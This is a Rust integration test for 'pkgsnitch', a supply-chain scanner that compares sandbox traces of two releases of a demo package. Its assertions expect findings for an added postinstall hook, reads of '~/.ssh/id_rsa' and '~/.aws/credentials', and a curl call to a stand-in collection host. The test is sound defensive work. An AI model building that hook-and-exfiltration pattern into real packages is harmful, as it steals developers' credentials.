//! End-to-end test of the analysis pipeline on real strace output.
//!
//! `tests/fixtures/demo-{old,new}` hold the raw sandbox output for the two
//! versions of the demo package in `demo/`. See the README in that directory
//! for how they were recorded. No container runtime is needed to run this.

use std::path::PathBuf;
use std::process::{Command, Output};

use serde_json::Value;

fn fixture(name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures")
        .join(name)
}

fn compare(old: &str, new: &str, extra: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_pkgsnitch"))
        .arg("compare-dirs")
        .arg(fixture(old))
        .arg(fixture(new))
        .args(extra)
        .output()
        .expect("pkgsnitch should run")
}

fn findings(out: &Output) -> Vec<(String, String, String)> {
    let report: Value = serde_json::from_slice(&out.stdout).expect("valid JSON report");
    report["findings"]
        .as_array()
        .expect("findings array")
        .iter()
        .map(|f| {
            let text = |key: &str| f[key].as_str().unwrap_or_default().to_string();
            (text("severity"), text("title"), text("target"))
        })
        .collect()
}

#[test]
fn hijacked_release_is_caught() {
    let out = compare("demo-old", "demo-new", &["--format", "json"]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "a critical verdict must fail the run"
    );

    let report: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(report["schema"], 1);
    assert_eq!(report["verdict"], "critical");
    assert_eq!(report["package"], "pkgsnitch-demo-leftpad");
    assert_eq!(report["old"], "1.0.0");
    assert_eq!(report["new"], "1.0.1");

    let found = findings(&out);
    let has = |severity: &str, title: &str, target: &str| {
        found
            .iter()
            .any(|(s, t, x)| s == severity && t == title && x.contains(target))
    };
    assert!(
        has(
            "critical",
            "runs command",
            "curl -fsSL https://collect.pkgsnitch-demo.invalid"
        ),
        "{found:#?}"
    );
    assert!(has("critical", "reads file", "~/.ssh/id_rsa"), "{found:#?}");
    assert!(
        has("critical", "reads file", "~/.aws/credentials"),
        "{found:#?}"
    );
    assert!(
        has(
            "high",
            "install script added",
            "postinstall: node scripts/setup.js"
        ),
        "{found:#?}"
    );
    assert!(
        has("medium", "runs command", "node scripts/setup.js"),
        "{found:#?}"
    );
    assert!(
        !found
            .iter()
            .any(|(_, _, target)| target.starts_with("sh -c ")),
        "the shell wrapper should be folded into its command: {found:#?}"
    );
}

#[test]
fn unchanged_release_is_clean() {
    let out = compare("demo-old", "demo-old", &["--format", "json"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(findings(&out).is_empty());
}

#[test]
fn fail_on_threshold_controls_the_exit_status() {
    // Nothing is more severe than critical, so `info` always fails here...
    assert_eq!(
        compare("demo-old", "demo-new", &["--fail-on", "info"])
            .status
            .code(),
        Some(1)
    );
    // ...and a clean comparison passes even at the strictest setting above info.
    assert_eq!(
        compare("demo-old", "demo-old", &["--fail-on", "low"])
            .status
            .code(),
        Some(0)
    );
}

#[test]
fn markdown_report_is_ready_for_a_pull_request() {
    let out = compare("demo-old", "demo-new", &["--format", "markdown"]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.starts_with("### pkgsnitch: `pkgsnitch-demo-leftpad 1.0.0 -> 1.0.1`"));
    assert!(text.contains("**Verdict: critical**"));
    assert!(text.contains("| **critical** | install | runs command |"));
}

#[test]
fn allowlist_accepts_reviewed_behavior() {
    let dir = std::env::temp_dir().join(format!("pkgsnitch-allow-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("allow");

    // Accepting everything this package does turns the verdict to info...
    std::fs::write(&file, "pkgsnitch-demo-leftpad reads file: *\npkgsnitch-demo-leftpad runs command: *\npkgsnitch-demo-leftpad install script added: *\n").unwrap();
    let out = compare(
        "demo-old",
        "demo-new",
        &["--format", "json", "--allow", file.to_str().unwrap()],
    );
    assert_eq!(out.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(report["verdict"], "info");
    assert!(report["findings"][0]["why"]
        .as_str()
        .unwrap()
        .starts_with("accepted by "));

    // ...while a rule for another package changes nothing.
    std::fs::write(&file, "some-other-package runs command: *\n").unwrap();
    let out = compare("demo-old", "demo-new", &["--allow", file.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));

    std::fs::remove_dir_all(&dir).unwrap();
}
